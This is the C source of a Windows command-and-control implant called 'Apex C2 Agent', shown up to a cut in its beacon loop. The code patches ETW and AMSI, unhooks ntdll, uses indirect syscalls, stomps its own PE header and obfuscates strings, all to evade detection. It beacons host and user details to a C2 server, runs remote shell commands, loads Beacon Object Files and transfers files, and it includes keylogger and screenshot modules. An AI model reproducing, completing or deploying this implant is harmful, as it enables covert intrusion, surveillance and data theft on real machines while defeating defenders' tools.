/*
 * Apex C2 Agent - Windows implant with evasion, BOF loading, encrypted comms
 * Compile: x86_64-w64-mingw32-gcc -O2 -o agent.exe main.c -lwinhttp -lws2_32 -lbcrypt -static-libgcc
 */
#define _WIN32_WINNT 0x0600
#define WIN32_LEAN_AND_MEAN

#include <winsock2.h>
#include <windows.h>
#include <winhttp.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "bcrypt.lib")

#ifndef C2_HOST
#define C2_HOST "127.0.0.1"
#endif
#ifndef C2_PORT
#define C2_PORT 8080
#endif
#ifndef USE_HTTPS
#define USE_HTTPS 0
#endif

/* ── Evasion options (toggled by builder via -D flags) ─── */
#ifndef ENABLE_ETW_PATCH
#define ENABLE_ETW_PATCH 1
#endif
#ifndef ENABLE_AMSI_PATCH
#define ENABLE_AMSI_PATCH 1
#endif
#ifndef ENABLE_SLEEP_ENCRYPT
#define ENABLE_SLEEP_ENCRYPT 1
#endif
#ifndef ENABLE_UNHOOK
#define ENABLE_UNHOOK 1
#endif
#ifndef ENABLE_INDIRECT_SYSCALL
#define ENABLE_INDIRECT_SYSCALL 1
#endif
#ifndef SYSCALL_METHOD
#define SYSCALL_METHOD 0  /* 0=auto, 1=hellsgate-disk, 2=halosgate-memory */
#endif
/* Issue #7: use NtCreateUserProcess instead of CreateProcessA */
#ifndef ENABLE_NT_PROCESS
#define ENABLE_NT_PROCESS 1
#endif
/* Issue #4: XOR-encrypt sensitive heap globals during sleep */
#ifndef ENABLE_HEAP_ENCRYPT
#define ENABLE_HEAP_ENCRYPT 1
#endif
/* PE Header Stomping: overwrite MZ/PE magic in-memory to defeat pe-sieve */
#ifndef ENABLE_PE_STOMP
#define ENABLE_PE_STOMP 1
#endif
#ifndef PE_STOMP_MODE
#define PE_STOMP_MODE 2    /* 1=DOS-only, 2=full-NT, 3=sledgehammer */
#endif
#ifndef PE_STOMP_RANDOMISE
#define PE_STOMP_RANDOMISE 0  /* 0=zero-fill, 1=pseudo-random */
#endif

#define BUF_SIZE 65536

/* Include agent modules */
#include "evasion.h"
#include "bof.h"
#include "crypto.h"
#include "token.h"
#include "keylogger.h"
#include "screenshot.h"
#include "portscan.h"

/* ── Runtime-configurable sleep (server can change via 'sleep' command) */
static int  g_sleep_ms   = 5000;
static int  g_jitter_pct = 20;
static char g_agent_id[128] = {0};

/* Writable C2 params (RW memory so encrypted_sleep can XOR in place) */
static char g_c2_host[256] = {0};
static int  g_c2_port      = 0;
static int  g_c2_https     = 0;

/* Own module base -- set in DllMain (DLL mode) or NULL (EXE mode).
 * Used by stomp_pe_header() so it stomps the correct image base. */
static HMODULE g_own_module = NULL;

/* ── ECDH / session key globals ──────────────────────────────
 * g_session_key  holds the 32-byte AES-256 key derived from the
 *                Curve25519 ECDH exchange with the teamserver.
 * g_session_ready is set to 1 once the key is valid.
 * g_ecdh_kp      holds the ephemeral CNG key pair (freed after handshake).
 * g_ecdh_pub     is the 32-byte raw public key we send to the server.
 */
static UCHAR       g_session_key[32] = {0};
static int         g_session_ready   = 0;
static ecdh_keypair g_ecdh_kp        = {0};
static UCHAR       g_ecdh_pub[ECDH_PUB_LEN] = {0}; /* 65-byte uncompressed P-256 point */

/* ── Helpers ─────────────────────────────────────────────── */

static void get_hostname(char *buf, size_t len) {
    DWORD n = (DWORD)len;
    if (GetComputerNameA(buf, &n)) return;
    strncpy(buf, "unknown", len-1); buf[len-1] = '\0';
}
static void get_username(char *buf, size_t len) {
    DWORD n = (DWORD)len;
    if (GetUserNameA(buf, &n)) return;
    strncpy(buf, "unknown", len-1); buf[len-1] = '\0';
}
static void get_internal_ip(char *buf, size_t len) {
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2,2), &wsa) != 0) { strncpy(buf,"0.0.0.0",len-1); buf[len-1]='\0'; return; }
    char name[256];
    if (gethostname(name, sizeof(name)) != 0) { strncpy(buf,"0.0.0.0",len-1); buf[len-1]='\0'; WSACleanup(); return; }
    struct hostent *he = gethostbyname(name);
    if (!he || !he->h_addr_list[0]) { strncpy(buf,"0.0.0.0",len-1); buf[len-1]='\0'; WSACleanup(); return; }
    struct in_addr addr;
    memcpy(&addr, he->h_addr_list[0], sizeof(addr));
    snprintf(buf, len, "%s", inet_ntoa(addr));
    WSACleanup();
}
static int get_pid(void) { return (int)GetCurrentProcessId(); }
static void get_process_name(char *buf, size_t len) {
    if (GetModuleFileNameA(NULL, buf, (DWORD)len)) return;
    strncpy(buf, "agent.exe", len-1); buf[len-1] = '\0';
}

/* ── Base64 ──────────────────────────────────────────────── */

void b64_encode(const unsigned char *in, size_t len, char *out) {
    static const char T[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    size_t i, j = 0;
    for (i = 0; i < len; i += 3) {
        unsigned long v = in[i] << 16;
        if (i+1 < len) v |= in[i+1] << 8;
        if (i+2 < len) v |= in[i+2];
        out[j++] = T[(v>>18)&0x3F]; out[j++] = T[(v>>12)&0x3F];
        out[j++] = (i+1 < len) ? T[(v>>6)&0x3F] : '=';
        out[j++] = (i+2 < len) ? T[v&0x3F] : '=';
    }
    out[j] = '\0';
}
static int b64_decode(const char *in, unsigned char *out, size_t out_len) {
    static const int D[256] = {
        ['A']=0,['B']=1,['C']=2,['D']=3,['E']=4,['F']=5,['G']=6,['H']=7,['I']=8,['J']=9,
        ['K']=10,['L']=11,['M']=12,['N']=13,['O']=14,['P']=15,['Q']=16,['R']=17,['S']=18,['T']=19,
        ['U']=20,['V']=21,['W']=22,['X']=23,['Y']=24,['Z']=25,
        ['a']=26,['b']=27,['c']=28,['d']=29,['e']=30,['f']=31,['g']=32,['h']=33,['i']=34,['j']=35,
        ['k']=36,['l']=37,['m']=38,['n']=39,['o']=40,['p']=41,['q']=42,['r']=43,['s']=44,['t']=45,
        ['u']=46,['v']=47,['w']=48,['x']=49,['y']=50,['z']=51,
        ['0']=52,['1']=53,['2']=54,['3']=55,['4']=56,['5']=57,['6']=58,['7']=59,
        ['8']=60,['9']=61,['+']=62,['/']=63
    };
    size_t slen = strlen(in), i, j = 0;
    for (i = 0; i < slen && in[i] != '=' && j < out_len; i += 4) {
        int a = D[(unsigned char)in[i]], b = (i+1<slen) ? D[(unsigned char)in[i+1]] : -1;
        if (b < 0) break;
        out[j++] = (unsigned char)((a<<2)|(b>>4));
        if (i+2<slen && in[i+2] != '=' && j < out_len) {
            int c = D[(unsigned char)in[i+2]]; out[j++] = (unsigned char)(((b&15)<<4)|(c>>2));
            if (i+3<slen && in[i+3] != '=' && j < out_len) {
                int d = D[(unsigned char)in[i+3]]; out[j++] = (unsigned char)(((c&3)<<6)|d);
            }
        }
    }
    return (int)j;
}

/* ── JSON helpers ────────────────────────────────────────── */

static void json_escape(const char *s, char *out, size_t out_len) {
    size_t j = 0;
    out[j++] = '"';
    while (*s && j < out_len - 4) {
        if (*s == '\\' || *s == '"') out[j++] = '\\';
        out[j++] = *s++;
    }
    out[j++] = '"'; out[j] = '\0';
}

static int json_get_string(const char *json, const char *key, char *out, size_t out_len) {
    const char *p = strstr(json, key);
    if (!p) return -1;
    p += strlen(key);
    while (*p && (*p == ':' || *p == ' ' || *p == '\t' || *p == '\n' || *p == '\r')) p++;
    if (*p != '"') return -1;
    p++;
    const char *end = strchr(p, '"');
    if (!end) return -1;
    size_t n = (size_t)(end - p);
    if (n >= out_len) n = out_len - 1;
    memcpy(out, p, n); out[n] = '\0';
    return 0;
}

/* ── Narrow → Wide (no swprintf needed) ──────────────────── */

static void ascii_to_wide(const char *src, WCHAR *dst, size_t dst_len) {
    size_t i;
    for (i = 0; src[i] && i < dst_len - 1; i++) dst[i] = (WCHAR)(unsigned char)src[i];
    dst[i] = 0;
}

/* ── Command Execution ───────────────────────────────────── */

static int exec_cmd(const char *cmd, char *out_b64, size_t out_b64_len) {
    (void)out_b64_len;
    SECURITY_ATTRIBUTES sa = {sizeof(sa), NULL, TRUE};
    HANDLE hRead, hWrite;
    if (!CreatePipe(&hRead, &hWrite, &sa, 0)) return -1;
    PROCESS_INFORMATION pi; memset(&pi, 0, sizeof(pi));
    char cmdline[4096];
    snprintf(cmdline, sizeof(cmdline), "cmd.exe /c %s", cmd);
    BOOL created = FALSE;

#if ENABLE_ARG_SPOOF
    if (g_arg_spoof && !created) {
        created = create_process_arg_spoof(cmdline, hWrite, hWrite, &pi);
    }
#endif

#if ENABLE_BLOCK_DLLS
    if (g_block_dlls && !created) {
        created = create_process_block_dlls(cmdline, hWrite, hWrite, &pi);
    }
#endif

#if ENABLE_NT_PROCESS && ENABLE_INDIRECT_SYSCALL
    if (!created) {
        NTSTATUS nt_st = NT_exec_cmdline(cmd, hWrite, hWrite, &pi);
        if (NT_SUCCESS(nt_st)) created = TRUE;
    }
#endif

    if (!created) {
        STARTUPINFOA si; memset(&si, 0, sizeof(si)); si.cb = sizeof(si);
        si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
        si.hStdOutput = si.hStdError = hWrite; si.wShowWindow = SW_HIDE;
        if (!CreateProcessA(NULL, cmdline, NULL, NULL, TRUE, CREATE_NO_WINDOW,
                            NULL, NULL, &si, &pi)) {
            CloseHandle(hRead); CloseHandle(hWrite); out_b64[0] = '\0'; return -1;
        }
    }

    CloseHandle(hWrite);
    char raw[BUF_SIZE]; DWORD n, total = 0;
    while (ReadFile(hRead, raw+total, sizeof(raw)-total-1, &n, NULL) && n > 0) {
        total += n; if (total >= sizeof(raw)-1) break;
    }
    raw[total] = '\0'; CloseHandle(hRead);
    WaitForSingleObject(pi.hProcess, 30000);
    CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
    while (total > 0 && (raw[total-1]=='\r' || raw[total-1]=='\n')) raw[--total] = '\0';
    b64_encode((unsigned char*)raw, total, out_b64);
    return 0;
}

/* ── HTTP POST ───────────────────────────────────────────── */

static int http_post(const char *host, int port, int use_https, const char *path,
                     const char *body, size_t body_len, const char *agent_id,
                     int encrypted,   /* 1 = body is encrypted, add X-Encrypted header */
                     char *resp, size_t resp_len)
{
    resp[0] = '\0';
    WCHAR whost[256]; ascii_to_wide(host, whost, 256);
    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    if (!hSession) return -1;
    HINTERNET hConn = WinHttpConnect(hSession, whost, (INTERNET_PORT)port, 0);
    if (!hConn) { WinHttpCloseHandle(hSession); return -1; }
    WCHAR wpath[512]; ascii_to_wide(path, wpath, 512);
    DWORD flags = use_https ? WINHTTP_FLAG_SECURE : 0;
    HINTERNET hReq = WinHttpOpenRequest(hConn, L"POST", wpath, NULL, WINHTTP_NO_REFERER,
                                        WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
    if (!hReq) { WinHttpCloseHandle(hConn); WinHttpCloseHandle(hSession); return -1; }

    char hdr_narrow[640];
    if (agent_id && agent_id[0]) {
        if (encrypted)
            snprintf(hdr_narrow, sizeof(hdr_narrow),
                     "Content-Type: application/octet-stream\r\nX-Agent-ID: %s\r\nX-Encrypted: 1\r\n",
                     agent_id);
        else
            snprintf(hdr_narrow, sizeof(hdr_narrow),
                     "Content-Type: application/json\r\nX-Agent-ID: %s\r\n", agent_id);
    } else {
        snprintf(hdr_narrow, sizeof(hdr_narrow), "Content-Type: application/json\r\n");
    }
    WCHAR hdr_wide[640]; ascii_to_wide(hdr_narrow, hdr_wide, 640);

    if (use_https) {
        DWORD secFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                         SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                         SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                         SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
        WinHttpSetOption(hReq, WINHTTP_OPTION_SECURITY_FLAGS, &secFlags, sizeof(secFlags));
    }

    if (!WinHttpSendRequest(hReq, hdr_wide, (DWORD)-1L, (LPVOID)body, (DWORD)body_len, (DWORD)body_len, 0)) {
        WinHttpCloseHandle(hReq); WinHttpCloseHandle(hConn); WinHttpCloseHandle(hSession); return -1;
    }
    if (!WinHttpReceiveResponse(hReq, NULL)) {
        WinHttpCloseHandle(hReq); WinHttpCloseHandle(hConn); WinHttpCloseHandle(hSession); return -1;
    }
    DWORD status = 0, sl = sizeof(status);
    WinHttpQueryHeaders(hReq, WINHTTP_QUERY_STATUS_CODE|WINHTTP_QUERY_FLAG_NUMBER, NULL, &status, &sl, NULL);
    DWORD nread; size_t total = 0;
    while (WinHttpReadData(hReq, resp+total, (DWORD)(resp_len-total-1), &nread) && nread > 0) {
        total += nread; if (total >= resp_len-1) break;
    }
    resp[total] = '\0';
    WinHttpCloseHandle(hReq); WinHttpCloseHandle(hConn); WinHttpCloseHandle(hSession);
    return (status >= 200 && status < 300) ? 0 : -1;
}

/*
 * http_post_encrypted:
 *   Convenience wrapper that GCM-encrypts plain_json, base64-encodes it,
 *   sends it, then base64-decodes and GCM-decrypts the server's response
 *   back into plain_resp (NUL-terminated JSON).
 *
 *   Returns 0 on success, -1 on any error.
 */
static int http_post_encrypted(const char *host, int port, int use_https,
                                const char *path,
                                const char *plain_json, size_t plain_len,
                                const char *agent_id,
                                char *plain_resp, size_t plain_resp_len)
{
    /* ── Encrypt ──────────────────────────────────────────────── */
    size_t enc_buf_size = plain_len + GCM_OVERHEAD + 4;
    UCHAR *enc_buf = (UCHAR *)malloc(enc_buf_size);
    if (!enc_buf) return -1;

    int enc_len = gcm_encrypt(g_session_key,
                              (const UCHAR *)plain_json, (ULONG)plain_len,
                              enc_buf, (ULONG)enc_buf_size);
    if (enc_len < 0) { free(enc_buf); return -1; }

    /* Base64-encode the encrypted blob */
    size_t b64_size = ((enc_len + 2) / 3) * 4 + 4;
    char *b64_body = (char *)malloc(b64_size);
    if (!b64_body) { free(enc_buf); return -1; }
    b64_encode(enc_buf, (size_t)enc_len, b64_body);
    free(enc_buf);

    /* ── Send ─────────────────────────────────────────────────── */
    char raw_resp[BUF_SIZE * 4];
    int ret = http_post(host, port, use_https, path,
                        b64_body, strlen(b64_body), agent_id, 1,
                        raw_resp, sizeof(raw_resp));
    free(b64_body);
    if (ret != 0) return -1;

    /* ── Decrypt response ─────────────────────────────────────── */
    if (!raw_resp[0]) {
        /* Empty body — treat as "{}": no tasks */
        strncpy(plain_resp, "{}", plain_resp_len - 1);
        plain_resp[plain_resp_len - 1] = '\0';
        return 0;
    }

    size_t resp_b64_len = strlen(raw_resp);
    size_t dec_buf_size = resp_b64_len + 4;
    UCHAR *dec_buf = (UCHAR *)malloc(dec_buf_size);
    if (!dec_buf) return -1;
    int dec_enc_len = b64_decode(raw_resp, dec_buf, dec_buf_size);
    if (dec_enc_len < (int)GCM_OVERHEAD) { free(dec_buf); return -1; }

    size_t plain_out_size = (size_t)dec_enc_len; /* plaintext <= ciphertext blob */
    if (plain_out_size > plain_resp_len - 1) plain_out_size = plain_resp_len - 1;
    int plain_len_out = gcm_decrypt(g_session_key,
                                    dec_buf, (ULONG)dec_enc_len,
                                    (UCHAR *)plain_resp, (ULONG)plain_out_size);
    free(dec_buf);
    if (plain_len_out < 0) return -1;

    plain_resp[plain_len_out] = '\0';
    return 0;
}

/* ── Built-in command handlers ───────────────────────────── */

/* Handle 'sleep' command: change beacon interval.
   Args: "<seconds> [jitter%]" */
static void handle_sleep_cmd(const char *args, char *out_b64) {
    int sec = 0, jit = -1;
    if (args && args[0]) {
        sec = atoi(args);
        const char *sp = strchr(args, ' ');
        if (sp) jit = atoi(sp + 1);
    }
    if (sec > 0) g_sleep_ms = sec * 1000;
    if (jit >= 0 && jit <= 100) g_jitter_pct = jit;

    char msg[256];
    snprintf(msg, sizeof(msg), "Sleep set to %dms (jitter %d%%)", g_sleep_ms, g_jitter_pct);
    b64_encode((unsigned char*)msg, strlen(msg), out_b64);
}

/* Handle 'whoami' */
static void handle_whoami(char *out_b64) {
    char buf[512], user[128], host[128];
    get_username(user, sizeof(user));
    get_hostname(host, sizeof(host));
    BOOL admin = BdIsAdmin();
    snprintf(buf, sizeof(buf), "%s\\%s%s", host, user, admin ? " [ADMIN]" : "");
    b64_encode((unsigned char*)buf, strlen(buf), out_b64);
}

/* Handle 'ps' - process listing */
static void handle_ps(char *out_b64) {
    char buf[BUF_SIZE]; size_t off = 0;
    off += snprintf(buf+off, sizeof(buf)-off, "%-8s %-8s %s\n", "PID", "PPID", "Name");
    off += snprintf(buf+off, sizeof(buf)-off, "%-8s %-8s %s\n", "---", "----", "----");
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe; pe.dwSize = sizeof(pe);
        if (Process32First(snap, &pe)) {
            do {
                off += snprintf(buf+off, sizeof(buf)-off, "%-8lu %-8lu %s\n",
                                pe.th32ProcessID, pe.th32ParentProcessID, pe.szExeFile);
                if (off >= sizeof(buf) - 128) break;
            } while (Process32Next(snap, &pe));
        }
        CloseHandle(snap);
    }
    b64_encode((unsigned char*)buf, off, out_b64);
}

/* Handle 'pwd' */
static void handle_pwd(char *out_b64) {
    char buf[MAX_PATH];
    GetCurrentDirectoryA(sizeof(buf), buf);
    b64_encode((unsigned char*)buf, strlen(buf), out_b64);
}

/* Handle 'cd' */
static void handle_cd(const char *path, char *out_b64) {
    if (SetCurrentDirectoryA(path)) {
        char buf[MAX_PATH];
        GetCurrentDirectoryA(sizeof(buf), buf);
        b64_encode((unsigned char*)buf, strlen(buf), out_b64);
    } else {
        const char *msg = "Failed to change directory";
        b64_encode((unsigned char*)msg, strlen(msg), out_b64);
    }
}

/* Handle 'bof' - execute Beacon Object File.
   Args are base64-encoded: <bof_b64> [args_b64] */
static void handle_bof(const char *args, char *out_b64) {
    if (!args || !args[0]) {
        unsigned char _em[] = {0x1e,0x38,0x2a,0x2c,0x2e,0x71,0x6b,0x29,0x24,0x2d,0x6b,0x77,0x29,0x2a,0x38,0x2e,0x7d,0x7f,0x14,0x24,0x29,0x21,0x75,0x6b,0x10,0x29,0x2a,0x38,0x2e,0x7d,0x7f,0x14,0x2a,0x39,0x2c,0x38,0x16,0x00};
        for (int _i=0;_em[_i];_i++) _em[_i]^=0x4B;
        b64_encode(_em, 37, out_b64);
        SecureZeroMemory(_em,sizeof(_em));
        return;
    }

    /* Split: first token is BOF base64, second (optional) is args base64 */
    char bof_b64[BUF_SIZE], bof_args_b64[BUF_SIZE];
    bof_b64[0] = bof_args_b64[0] = '\0';
    const char *sp = strchr(args, ' ');
    if (sp) {
        size_t len1 = (size_t)(sp - args);
        if (len1 >= sizeof(bof_b64)) len1 = sizeof(bof_b64) - 1;
        memcpy(bof_b64, args, len1); bof_b64[len1] = '\0';
        strncpy(bof_args_b64, sp + 1, sizeof(bof_args_b64) - 1);
    } else {
        strncpy(bof_b64, args, sizeof(bof_b64) - 1);
    }

    /* Decode BOF */
    unsigned char *bof_data = (unsigned char*)malloc(BUF_SIZE);
    if (!bof_data) { b64_encode((unsigned char*)"out of memory", 13, out_b64); return; }
    int bof_len = b64_decode(bof_b64, bof_data, BUF_SIZE);
    if (bof_len <= 0) {
        unsigned char _ev[] = {0x22,0x25,0x3d,0x2a,0x27,0x22,0x2f,0x6b,0x9,0x4,0xd,0x6b,0x2f,0x2a,0x3f,0x2a,0x00};
        for (int _i=0;_ev[_i];_i++) _ev[_i]^=0x4B;
        free(bof_data); b64_encode(_ev, 16, out_b64);
        SecureZeroMemory(_ev,sizeof(_ev)); return;
    }

    /* Decode args */
    unsigned char *bof_args = NULL;
    int args_len = 0;
    if (bof_args_b64[0]) {
        bof_args = (unsigned char*)malloc(BUF_SIZE);
        if (bof_args) args_len = b64_decode(bof_args_b64, bof_args, BUF_SIZE);
    }

    /* Execute BOF */
    char bof_output[BUF_SIZE]; DWORD bof_out_len = 0;
    bof_exec(bof_data, (size_t)bof_len, bof_args, (size_t)args_len,
             bof_output, sizeof(bof_output), &bof_out_len);

    if (bof_out_len > 0)
        b64_encode((unsigned char*)bof_output, bof_out_len, out_b64);
    else
        {
            unsigned char _en[] = {0x10,0x9,0x4,0xd,0x6b,0x2e,0x33,0x2e,0x28,0x3e,0x3f,0x2e,0x2f,0x67,0x6b,0x25,0x24,0x6b,0x24,0x3e,0x3f,0x3b,0x3e,0x3f,0x16,0x00};
            for (int _i=0;_en[_i];_i++) _en[_i]^=0x4B;
            b64_encode(_en, 25, out_b64);
            SecureZeroMemory(_en,sizeof(_en));
        }

    free(bof_data);
    if (bof_args) free(bof_args);
}

/* Handle 'getuid' */
static void handle_getuid(char *out_b64) {
    char buf[256], user[128];
    get_username(user, sizeof(user));
    snprintf(buf, sizeof(buf), "%s (PID: %d, Admin: %s)",
             user, get_pid(), BdIsAdmin() ? "Yes" : "No");
    b64_encode((unsigned char*)buf, strlen(buf), out_b64);
}

/* Handle 'download' - read file and return contents */
static void handle_download(const char *path, char *out_b64) {
    HANDLE hFile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        char msg[256]; snprintf(msg, sizeof(msg), "Cannot open: %s", path);
        b64_encode((unsigned char*)msg, strlen(msg), out_b64); return;
    }
    DWORD sz = GetFileSize(hFile, NULL);
    if (sz > BUF_SIZE - 1) sz = BUF_SIZE - 1;
    char *buf = (char*)malloc(sz + 1);
    if (!buf) { CloseHandle(hFile); b64_encode((unsigned char*)"out of memory", 13, out_b64); return; }
    DWORD nread;
    ReadFile(hFile, buf, sz, &nread, NULL);
    CloseHandle(hFile);
    b64_encode((unsigned char*)buf, nread, out_b64);
    free(buf);
}

/* Handle 'upload' - write file to target disk.
   Decoded args format: "<remote_path>\n<base64_file_data>" */
static void handle_upload(const char *args, char *out_b64) {
    if (!args || !args[0]) {
        b64_encode((unsigned char*)"Usage: upload <remote_path> (data in args)", 43, out_b64);
        return;
    }
    const char *nl = strchr(args, '\n');
    if (!nl) {
        b64_encode((unsigned char*)"Invalid upload format: expected path\\ndata", 42, out_b64);
        return;
    }
    char path[4096];
    size_t plen = (size_t)(nl - args);
    if (plen >= sizeof(path)) plen = sizeof(path) - 1;
    memcpy(path, args, plen);
    path[plen] = '\0';

    const char *data_b64 = nl + 1;
    size_t alloc_sz = strlen(data_b64) + 1;
    if (alloc_sz < BUF_SIZE) alloc_sz = BUF_SIZE;
    unsigned char *file_data = (unsigned char *)malloc(alloc_sz);
    if (!file_data) {
        b64_encode((unsigned char*)"Out of memory", 13, out_b64);
        return;
    }
    int data_len = b64_decode(data_b64, file_data, alloc_sz);
    if (data_len <= 0) {
        free(file_data);
        b64_encode((unsigned char*)"Invalid file data", 17, out_b64);
        return;
    }

    HANDLE hFile = CreateFileA(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                                FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        char msg[256];
        snprintf(msg, sizeof(msg), "Cannot create file: %s (err %lu)", path, GetLastError());
        b64_encode((unsigned char*)msg, strlen(msg), out_b64);
        free(file_data);
        return;
    }
    DWORD written;
    WriteFile(hFile, file_data, (DWORD)data_len, &written, NULL);
    CloseHandle(hFile);
    free(file_data);

    char msg[256];
    snprintf(msg, sizeof(msg), "Uploaded %lu bytes to %s", (unsigned long)written, path);
    b64_encode((unsigned char*)msg, strlen(msg), out_b64);
}

/* ── Multi-task JSON parser ─────────────────────────────── */

#define MAX_TASKS_PER_POLL 16

typedef struct {
    char id[128];
    char command[256];
    char arguments_b64[BUF_SIZE];
} parsed_task;

static int parse_tasks(const char *resp, parsed_task *tasks, int max_tasks) {
    const char *arr = strstr(resp, "\"tasks\"");
    if (!arr) return 0;
    arr = strchr(arr, '[');
    if (!arr) return 0;

    int count = 0;
    const char *cursor = arr + 1;
    char obj[BUF_SIZE];

    while (count < max_tasks) {
        while (*cursor && *cursor != '{' && *cursor != ']') cursor++;
        if (*cursor != '{') break;

        const char *start = cursor;
        int depth = 0;
        do {
            if (*cursor == '"') {
                cursor++;
                while (*cursor && *cursor != '"') {
                    if (*cursor == '\\') cursor++;
                    cursor++;
                }
                if (*cursor) cursor++;
            } else {
                if (*cursor == '{') depth++;
                else if (*cursor == '}') depth--;
                cursor++;
            }
        } while (*cursor && depth > 0);

        size_t len = (size_t)(cursor - start);
        if (len >= sizeof(obj)) len = sizeof(obj) - 1;
        memcpy(obj, start, len);
        obj[len] = '\0';

        tasks[count].id[0] = '\0';
        tasks[count].command[0] = '\0';
        tasks[count].arguments_b64[0] = '\0';

        json_get_string(obj, "\"id\"", tasks[count].id, sizeof(tasks[count].id));
        json_get_string(obj, "\"command\"", tasks[count].command, sizeof(tasks[count].command));
        json_get_string(obj, "\"arguments\"", tasks[count].arguments_b64, sizeof(tasks[count].arguments_b64));

        if (tasks[count].id[0] && tasks[count].command[0])
            count++;
    }
    return count;
}

/* ── Beacon Loop ─────────────────────────────────────────── */

static DWORD WINAPI agent_loop(LPVOID unused) {
    (void)unused;

    /*
     * FIRST: cache our .text section location for Ekko/Foliage sleep.
     * We must do this before PE Stomping because stomp_pe_header destroys
     * the section table that get_own_text_section relies on.
     */
#if ENABLE_SLEEP_ENCRYPT
    get_own_text_section();
#endif

    /*
     * NEXT: stomp our own PE header before any network or evasion calls.
     * Windows has already mapped all sections -- header is now dead weight.
     * This defeats pe-sieve, Moneta, and memory-dump forensic scanners.
     */
#if ENABLE_PE_STOMP
    {
        HMODULE own_base = g_own_module ? g_own_module : GetModuleHandleA(NULL);
        stomp_pe_header(own_base);
    }
#endif

    /* Copy compile-time C2 params into writable globals */
    strncpy(g_c2_host, C2_HOST, sizeof(g_c2_host) - 1);
    g_c2_host[sizeof(g_c2_host) - 1] = '\0';
    g_c2_port  = C2_PORT;
    g_c2_https = USE_HTTPS;

    /* Register all sensitive globals for heap XOR during sleep.
       Session key is registered after it is derived from ECDH. */
    heap_register_region(g_agent_id,    sizeof(g_agent_id));
    heap_register_region(g_c2_host,     sizeof(g_c2_host));
    heap_register_region(&g_c2_port,    sizeof(g_c2_port));

    /* ── Generate ephemeral ECDH-P256 key pair ── */
    if (ecdh_gen_keypair(&g_ecdh_kp, g_ecdh_pub) != 0) {
        memset(g_ecdh_pub, 0, sizeof(g_ecdh_pub));
    }

    const char *path = "/";

    /* ── Evasion at startup ── */
#if ENABLE_INDIRECT_SYSCALL
    /* Resolve SSNs first — before any NT calls, including unhook_ntdll.
       If ntdll is already partially hooked this still works via HalosGate scan. */
    gate_init();
#endif
#if ENABLE_UNHOOK
    unhook_ntdll();
#endif
#if ENABLE_ETW_PATCH
    patch_etw();
#endif
#if ENABLE_AMSI_PATCH
    patch_amsi();
#endif
#if ENABLE_SYNTHETIC_FRAMES
    synth_frames_init();
#endif

    char hostname[64], username[64], internal_ip[64], process_name[MAX_PATH];
    get_hostname(hostname, sizeof(hostname));
    get_username(username, sizeof(username));
    get_internal_ip(internal_ip, sizeof(internal_ip));
    get_process_name(process_name, sizeof(process_name));

    srand((unsigned)GetTickCount() ^ GetCurrentProcessId());

    char body[BUF_SIZE], resp[BUF_SIZE * 2];

    for (;;) {
        if (!g_agent_id[0]) {
            /* ── First check-in: register and perform ECDH handshake ── */
            char he[128], ue[128], ie[128], pe[512];
            json_escape(hostname, he, sizeof(he));
            json_escape(username, ue, sizeof(ue));
            json_escape(internal_ip, ie, sizeof(ie));
            json_escape(process_name, pe, sizeof(pe));

            /* Base64-encode our 65-byte uncompressed P-256 public key */
            char pub_b64[100]; /* ceil(65/3)*4 + 1 = 92 + 1 */
            b64_encode(g_ecdh_pub, ECDH_PUB_LEN, pub_b64);

            snprintf(body, sizeof(body),
                "{\"sysinfo\":{\"hostname\":%s,\"username\":%s,\"os\":\"Windows\",\"arch\":\"amd64\","
                "\"pid\":%d,\"process_name\":%s,\"internal_ip\":%s,\"sleep\":%d,\"jitter\":%d},"
                "\"pubkey\":\"%s\"}",
                he, ue, get_pid(), pe, ie, g_sleep_ms / 1000, g_jitter_pct, pub_b64);

            if (http_post(g_c2_host, g_c2_port, g_c2_https, path,
                          body, strlen(body), NULL, 0,
                          resp, sizeof(resp)) != 0)
                goto do_sleep;

            /* Extract agent_id */
            json_get_string(resp, "\"agent_id\"", g_agent_id, sizeof(g_agent_id));

            /* ── Complete ECDH to derive session key ── */
            {
                char srv_pub_b64[100], kex_nonce_b64[52];
                srv_pub_b64[0] = kex_nonce_b64[0] = '\0';
                json_get_string(resp, "\"server_pubkey\"",  srv_pub_b64,   sizeof(srv_pub_b64));
                json_get_string(resp, "\"kex_nonce\"",     kex_nonce_b64, sizeof(kex_nonce_b64));

                if (srv_pub_b64[0] && kex_nonce_b64[0] && g_ecdh_kp.hKey) {
                    UCHAR srv_pub[ECDH_PUB_LEN], kex_nonce[32], shared[32];
                    memset(srv_pub, 0, ECDH_PUB_LEN); memset(kex_nonce, 0, 32);

                    b64_decode(srv_pub_b64,   srv_pub,   ECDH_PUB_LEN);
                    b64_decode(kex_nonce_b64, kex_nonce, 32);

                    if (ecdh_compute_shared(&g_ecdh_kp, srv_pub, shared) == 0) {
                        hkdf_sha256(shared, 32, kex_nonce, 32, "apex-c2-v1",
                                    g_session_key, 32);
                        g_session_ready = 1;
                        /* Register session key for sleep XOR protection */
                        heap_register_region(g_session_key, sizeof(g_session_key));
                    }
                    SecureZeroMemory(shared, 32);
                }
            }
            /* Destroy ephemeral private key — no longer needed */
            ecdh_free(&g_ecdh_kp);
            SecureZeroMemory(g_ecdh_pub, 32);

            goto do_sleep;
        }

